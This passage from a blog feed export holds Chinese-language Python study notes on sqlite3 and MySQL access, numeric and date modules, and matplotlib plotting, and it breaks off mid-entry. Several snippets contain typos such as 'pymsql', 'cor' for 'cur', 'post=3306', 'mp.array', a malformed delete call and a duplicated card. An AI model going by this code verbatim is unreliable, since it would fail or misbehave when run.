      <link href="2021/03/10/python-shu-ju-ku-fang-wen/"/>
      <url>2021/03/10/python-shu-ju-ku-fang-wen/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Python数据库访问模块"><a href="#一、Python数据库访问模块" class="headerlink" title="一、Python数据库访问模块"></a>一、Python数据库访问模块</h1><p><strong>通用数据库访问模块：ODBC&amp;JDBC</strong></p><ul><li>ODBC Interface: PythonWin附带</li><li>pyodbc: 开源，完整实现DB-API2.0</li><li>mxPDBS: 付费，部分实现DB-API2.0</li><li>zxJDBC: Jython2.1+包含</li></ul><p><strong>专用数据库访问模块</strong></p><ul><li>MySQL: MySQL-python(MySQLdb，过时)、mysqlclient、pymysql、sqlalchemy(ORM框架，Web编程）</li><li>PostgreSQL: PyGreSQL</li><li>Oracle: DCOracle2</li><li>SQLServer: pymssql<h1 id="二、SQLite数据库"><a href="#二、SQLite数据库" class="headerlink" title="二、SQLite数据库"></a>二、SQLite数据库</h1>SQLite是一款开源的轻型的数据库</li><li>简单、资源低占用</li><li>实现了大部分SQL-92标准</li><li>无类型检查，适用于脚本语言</li><li>整个SQLite数据库存于一个文件<br>  SQLite支持的数据类型包括：NULL、INTEGER、REAL、TEXT和BLOB，分别对应Python的数据类型：None、int、float、str和bytes</li></ul><p><strong>sqlite3模块</strong><br>C实现，提供访问和操作SQLite数据库的各种功能<br>sqlite3模块：</p><ul><li>sqlite3.version    #常量</li><li>sqlite3.connect(database)    #函数，返回Connect对象</li><li>sqlite3.Connect    #数据库连接对象</li><li>sqlite3.Cursor    #游标对象</li><li>sqlite3.Row    #行对象<h1 id="三、连接和操作SQLITE数据库"><a href="#三、连接和操作SQLITE数据库" class="headerlink" title="三、连接和操作SQLITE数据库"></a>三、连接和操作SQLITE数据库</h1>Python访问数据库的典型步骤：</li></ul><ol><li>导入相应的数据库模块</li><li>建立数据库连接，返回Connection对象</li></ol><pre class=" language-python"><code class="language-python">con<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>r<span class="token string">"c:\python\sales.db"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#r是对字符'\'转义</span>con<span class="token operator">=</span>pymsql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'abc'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'123456'</span><span class="token punctuation">,</span>db<span class="token operator">=</span><span class="token string">'test1'</span><span class="token punctuation">,</span>charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#服务器端数据库的连接</span></code></pre><ol start="3"><li>创建游标对象cur</li><li>使用Cursor对象得到execute执行SQL命令返回结果<br>（建议直接使用Connection对象的execute方法，返回Cursor对象）</li></ol><pre class=" language-python"><code class="language-python">cur<span class="token operator">=</span>con<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select id,name from region"</span><span class="token punctuation">)</span>regions<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"021"</span><span class="token punctuation">,</span><span class="token string">"上海"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"022"</span><span class="token punctuation">,</span><span class="token string">"天津"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"023"</span><span class="token punctuation">,</span><span class="token string">"重庆"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"024"</span><span class="token punctuation">,</span><span class="token string">"沈阳"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>con<span class="token punctuation">.</span>executemany<span class="token punctuation">(</span><span class="token string">"insert into region(id,name) values(?,?)"</span><span class="token punctuation">,</span>regions<span class="token punctuation">)</span></code></pre><ol start="5"><li>获取游标的查询结果集Cursor.fetch()</li></ol><pre class=" language-python"><code class="language-python">cor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#返回结果集的下一行(Row对象)，或None</span>cor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#返回结果集的剩余行(Row对象列表)，或空表</span>cor<span class="token punctuation">.</span>fetchmany<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#返回结果集的多行(Row对象列表)，或空表</span>cor<span class="token punctuation">.</span>rowcount    <span class="token comment" spellcheck="true">#执行sql命令实际影响的行数</span></code></pre><p>Row对象r为一行查询结果序列，支持以下访问</p><pre class=" language-python"><code class="language-python">r<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#按索引访问，返回第i列数据</span>r<span class="token punctuation">[</span>colname<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#按列名访问，返回colname列数据</span>len<span class="token punctuation">(</span>r<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#返回列数</span>r<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#返回列名列表</span><span class="token comment" spellcheck="true">#应用</span><span class="token keyword">for</span> r <span class="token keyword">in</span> con<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select id,name from region"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>r<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><ol start="6"><li>数据库的提交和回滚</li></ol><pre class=" language-python"><code class="language-python">con<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#提交</span>con<span class="token punctuation">.</span>rollback<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#回滚</span></code></pre><ol start="7"><li>关闭Cursor对象和Connection对象</li></ol><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#cur.close()    #关闭游标</span><span class="token comment" spellcheck="true">#con.close()    #关闭数据库</span>r<span class="token operator">=</span>con<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"delete from region where id=?"</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">"024"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'删除了'</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>rowcount<span class="token punctuation">,</span><span class="token string">'行记录'</span><span class="token punctuation">)</span>con<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#提交</span>con<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#关闭数据库</span></code></pre><h1 id="四、PYTHON使用MYSQL数据库"><a href="#四、PYTHON使用MYSQL数据库" class="headerlink" title="四、PYTHON使用MYSQL数据库"></a>四、PYTHON使用MYSQL数据库</h1><p>要使用Python操作MySQL，首先需要安装MySQL-Python的包，可用pip方式安装：pip install MySQLClient。<br>启动MySQL服务器：以管理员身份启动cmd，输入命令：net start mysql<br>Python中使用MySQL: import MySQLdb<br>创建Connection</p><pre class=" language-python"><code class="language-python">con<span class="token operator">=</span>MySQLdb<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'abc'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'123456'</span><span class="token punctuation">,</span>db<span class="token operator">=</span><span class="token string">'test1'</span><span class="token punctuation">,</span>charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span></code></pre><p>Connection支持的方法：</p><ul><li>cursor()    #创建并返回游标</li><li>commit()    #提交当前事务</li><li>rollback()    #回滚当前事务</li><li>close()    #关闭Connection</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#MySQL示例</span>conn<span class="token operator">=</span>MySQLdb<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>post<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'abc'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'123456'</span><span class="token punctuation">,</span>db<span class="token operator">=</span><span class="token string">'test1'</span><span class="token punctuation">,</span>charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""create table if not EXISTS user(userid int(11) PRIMARY KEY,username VARCHAR(20))"""</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"insert into user(userid,username) values('%d','%s')"</span><span class="token operator">%</span><span class="token punctuation">(</span>int<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'name'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'select * from user'</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'update user set username="name91" where userid=9'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cursor<span class="token punctuation">.</span>rowcount<span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>rollback<span class="token punctuation">(</span><span class="token punctuation">)</span>cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>3/10/2021 11:31:38 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数值、日期和时间处理</title>
      <link href="2021/03/10/shu-zhi-ri-qi-he-shi-jian-chu-li/"/>
      <url>2021/03/10/shu-zhi-ri-qi-he-shi-jian-chu-li/</url>
      
        <content type="html"><![CDATA[<h1 id="1、相关模块概述"><a href="#1、相关模块概述" class="headerlink" title="1、相关模块概述"></a>1、相关模块概述</h1><h2 id="1-数值处理的相关模块"><a href="#1-数值处理的相关模块" class="headerlink" title="1.数值处理的相关模块"></a>1.数值处理的相关模块</h2><h3 id="（1）Python标准款中包括下列数值处理相关模块"><a href="#（1）Python标准款中包括下列数值处理相关模块" class="headerlink" title="（1）Python标准款中包括下列数值处理相关模块"></a>（1）Python标准款中包括下列数值处理相关模块</h3><ul><li>numbers模块：数值抽象类。包含类Complex、Real、Rational、Integral。</li><li>math模块：数学函数</li><li>cmath模块：复数运算数学函数</li><li>decimal模块：高精度数值运算</li><li>fractions模块：分数运算模块</li><li>random模块：随机数模块<br><img src="https://www.hualigs.cn/image/6048d9b722e3a.jpg" alt=""></li></ul><h3 id="（2）数值运算模块Numpy。"><a href="#（2）数值运算模块Numpy。" class="headerlink" title="（2）数值运算模块Numpy。"></a>（2）数值运算模块Numpy。</h3><p>Numpy模块主要提供数组和矩阵处理功能，还包括高级功能，如傅里叶变换等。</p><h3 id="（3）科学计算模块SciPy。"><a href="#（3）科学计算模块SciPy。" class="headerlink" title="（3）科学计算模块SciPy。"></a>（3）科学计算模块SciPy。</h3><p>SciPy模块包括统计、优化、整合、线性代数、傅里叶变换、信号和图像处理、常微分方程求解器等功能。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#random应用</span><span class="token comment" spellcheck="true">#随机生成扑克牌的四手牌（4个人的牌局，每手牌13张）</span><span class="token keyword">import</span> random<span class="token comment" spellcheck="true">#一副牌：Club（梅花）、Diamond（方块）、Heart（红桃）、Spade（黑桃）</span>cards<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'2C'</span><span class="token punctuation">,</span><span class="token string">'3C'</span><span class="token punctuation">,</span><span class="token string">'4C'</span><span class="token punctuation">,</span><span class="token string">'5C'</span><span class="token punctuation">,</span><span class="token string">'6C'</span><span class="token punctuation">,</span><span class="token string">'7C'</span><span class="token punctuation">,</span><span class="token string">'8C'</span><span class="token punctuation">,</span><span class="token string">'9C'</span><span class="token punctuation">,</span><span class="token string">'10C'</span><span class="token punctuation">,</span><span class="token string">'JC'</span><span class="token punctuation">,</span><span class="token string">'QC'</span><span class="token punctuation">,</span><span class="token string">'KC'</span><span class="token punctuation">,</span><span class="token string">'AC'</span><span class="token punctuation">,</span>       <span class="token string">'2D'</span><span class="token punctuation">,</span><span class="token string">'3C'</span><span class="token punctuation">,</span><span class="token string">'4D'</span><span class="token punctuation">,</span><span class="token string">'5D'</span><span class="token punctuation">,</span><span class="token string">'6D'</span><span class="token punctuation">,</span><span class="token string">'7D'</span><span class="token punctuation">,</span><span class="token string">'8D'</span><span class="token punctuation">,</span><span class="token string">'9D'</span><span class="token punctuation">,</span><span class="token string">'10D'</span><span class="token punctuation">,</span><span class="token string">'JD'</span><span class="token punctuation">,</span><span class="token string">'QD'</span><span class="token punctuation">,</span><span class="token string">'KD'</span><span class="token punctuation">,</span><span class="token string">'AD'</span><span class="token punctuation">,</span>       <span class="token string">'2H'</span><span class="token punctuation">,</span><span class="token string">'3H'</span><span class="token punctuation">,</span><span class="token string">'4H'</span><span class="token punctuation">,</span><span class="token string">'5H'</span><span class="token punctuation">,</span><span class="token string">'6H'</span><span class="token punctuation">,</span><span class="token string">'7H'</span><span class="token punctuation">,</span><span class="token string">'8H'</span><span class="token punctuation">,</span><span class="token string">'9H'</span><span class="token punctuation">,</span><span class="token string">'10H'</span><span class="token punctuation">,</span><span class="token string">'JH'</span><span class="token punctuation">,</span><span class="token string">'QH'</span><span class="token punctuation">,</span><span class="token string">'KH'</span><span class="token punctuation">,</span><span class="token string">'AH'</span><span class="token punctuation">,</span>       <span class="token string">'2S'</span><span class="token punctuation">,</span><span class="token string">'3S'</span><span class="token punctuation">,</span><span class="token string">'4S'</span><span class="token punctuation">,</span><span class="token string">'5S'</span><span class="token punctuation">,</span><span class="token string">'6S'</span><span class="token punctuation">,</span><span class="token string">'7S'</span><span class="token punctuation">,</span><span class="token string">'8S'</span><span class="token punctuation">,</span><span class="token string">'9S'</span><span class="token punctuation">,</span><span class="token string">'10S'</span><span class="token punctuation">,</span><span class="token string">'JS'</span><span class="token punctuation">,</span><span class="token string">'QS'</span><span class="token punctuation">,</span><span class="token string">'KS'</span><span class="token punctuation">,</span><span class="token string">'AS'</span><span class="token punctuation">]</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>cards<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#混排，洗牌</span>deck1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>deck2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>deck3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>deck4<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#初始化四手牌</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#发牌</span>    deck1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cards<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    deck2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cards<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    deck3<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cards<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    deck4<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cards<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>deck1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>deck2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>deck3<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>deck4<span class="token punctuation">)</span>       </code></pre><h2 id="2-数值运算模块NUMPY"><a href="#2-数值运算模块NUMPY" class="headerlink" title="2.数值运算模块NUMPY"></a>2.数值运算模块NUMPY</h2><h3 id="（1）创建数组"><a href="#（1）创建数组" class="headerlink" title="（1）创建数组"></a>（1）创建数组</h3><p>（1）通过array函数，把序列对象参数转化为数组</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npa<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>b<span class="token operator">=</span>mp<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>（2）通过arrange、linspace和logspace函数创建数组</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npa<span class="token operator">=</span>np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#从start到stop，2为步长</span>b<span class="token operator">=</span>np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#从0到2pi，创建长度为10的等差数列数组</span>c<span class="token operator">=</span>np<span class="token punctuation">.</span>logspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#等比数列</span></code></pre><p><img src="https://www.hualigs.cn/image/6048d9b14717c.jpg" alt=""></p><h3 id="（2）数组应用"><a href="#（2）数组应用" class="headerlink" title="（2）数组应用"></a>（2）数组应用</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#绘制正弦余弦函数图形</span><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt <span class="token keyword">import</span> mathx<span class="token operator">=</span>np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>y1<span class="token operator">=</span>np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>x<span class="token punctuation">)</span>y2<span class="token operator">=</span>np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span>x<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y1<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y2<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/6048d9b12e910.jpg" alt="">                                       </p><h1 id="2、日期和时间处理概述"><a href="#2、日期和时间处理概述" class="headerlink" title="2、日期和时间处理概述"></a>2、日期和时间处理概述</h1><ul><li><p>datetime模块：日期和时间类</p></li><li><p>calendar模块：日历函数和类</p></li><li><p>time模块：时间函数</p><h2 id="1-DATETIME模块"><a href="#1-DATETIME模块" class="headerlink" title="1.DATETIME模块"></a>1.DATETIME模块</h2></li><li><p>两个常量：datetime.MINTEAR(1)和datetime.MAXYEAR(9999)</p></li><li><p>获取当前日期时间<br>  通过datetime模块的date.today()函数可以返回表示当前日期的date对象，通过其实例对象方法，可以获取其年、月、日等信息</p><p>  通过datime模块的datetime.now()函数可以返回表示当前日期时间的datetime对象，通过其实例对象方法，可以获取其年、月、日、时、分、秒等信息</p><h2 id="2-time模块"><a href="#2-time模块" class="headerlink" title="2.time模块"></a>2.time模块</h2></li><li><p>time模块中的strftime()函数将struct_time对象格式化为字符串</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#日期时间格式化为字符串示例</span><span class="token keyword">from</span> time <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">print</span><span class="token punctuation">(</span>strftime<span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y{y}%m{m}%d{d}%H{h}%M{f}%S{s}'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>y<span class="token operator">=</span><span class="token string">'年'</span><span class="token punctuation">,</span>m<span class="token operator">=</span><span class="token string">'月'</span><span class="token punctuation">,</span>d<span class="token operator">=</span><span class="token string">'日'</span><span class="token punctuation">,</span>h<span class="token operator">=</span><span class="token string">'时'</span><span class="token punctuation">,</span>f<span class="token operator">=</span><span class="token string">'分'</span><span class="token punctuation">,</span>s<span class="token operator">=</span><span class="token string">'秒'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li><li><p>time模块中的strptime()函数将时间字符串解析为struct_time对象</p></li></ul><h1 id="3、字符串和文本处理的相关模块"><a href="#3、字符串和文本处理的相关模块" class="headerlink" title="3、字符串和文本处理的相关模块"></a>3、字符串和文本处理的相关模块</h1><ul><li>string模块：包含若干字符集常量，其处理字符串的函数已经被字符串对象的方法替代</li><li>re模块：正则表达式处理</li><li>codecs模块：字符编码处理</li><li>difflib模块：比较字符串列表的差异</li><li>gettext模块：语言国际化</li><li>textwrap模块：格式化文本段落</li><li>unicodedata模块：Unicode字符库<br>3/10/2021 10:56:22 PM </li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>基于MATOLOTLIB模块的绘图</title>
      <link href="2021/03/09/ji-yu-matolotlib-mo-kuai-de-hui-tu/"/>
      <url>2021/03/09/ji-yu-matolotlib-mo-kuai-de-hui-tu/</url>
      
        <content type="html"><![CDATA[<p>Matplotlib是一套面向对象的绘图库，其绘制的图表中的每个绘图元素（例如线条、文字、刻度等）都是对象</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#绘制x轴坐标值为0、1、2、3、4，所对应的y轴坐标值为1、2、5、6、8的折线图</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltplt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'some numbers'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/60476819d3dd7.jpg" alt=""></p><p>plot()函数</p><ul><li>plot(x,y,’bo’)    #用蓝色，小圆点标记</li></ul><ul><li>plot(y)    #改变纵轴坐标数值，横轴默认0,1,2……</li></ul><ul><li>plot(x1,y1,’g^’,x2,y2,’g-o’)    #使用多个x,y,format对作变量，把它们画在一个图里，格式串也可改为color=’green’,linestyle=’dashen’,marker=’o’。</li></ul><p>subplot(numRows,numCols,plotNum)快速绘制包含多个子图的图表，左上的子区域的编号为1，若numRows, numCols和plotNum这三个数都小于10的话，可缩写为一个整数，例如subplot(323)等价于subplot(3,2,3)，subplot在plotNum指定的区域中创建一个轴对象。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#使用Matplotlib模块绘制y=sin(x)的函数曲线</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> mathx<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>math<span class="token punctuation">.</span>pi<span class="token operator">*</span>i<span class="token operator">/</span><span class="token number">100</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">]</span>y<span class="token operator">=</span><span class="token punctuation">[</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">]</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/604764dc6bfb2.jpg" alt=""></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#利用NumPy模块和Matplotlib.pyplot工具包绘制y=e^-x*cos(2*pi*x)以及y=cos(2*pi*x)的函数曲线</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span>t<span class="token punctuation">)</span><span class="token operator">*</span>np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token operator">*</span>t<span class="token punctuation">)</span>t1<span class="token operator">=</span>np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">5.0</span><span class="token punctuation">,</span><span class="token number">0.1</span><span class="token punctuation">)</span>t2<span class="token operator">=</span>np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">5.0</span><span class="token punctuation">,</span><span class="token number">0.02</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">211</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>t1<span class="token punctuation">,</span>f<span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'bo'</span><span class="token punctuation">,</span>t2<span class="token punctuation">,</span>f<span class="token punctuation">(</span>t2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">212</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>t2<span class="token punctuation">,</span>np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token operator">*</span>t2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'r--'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token 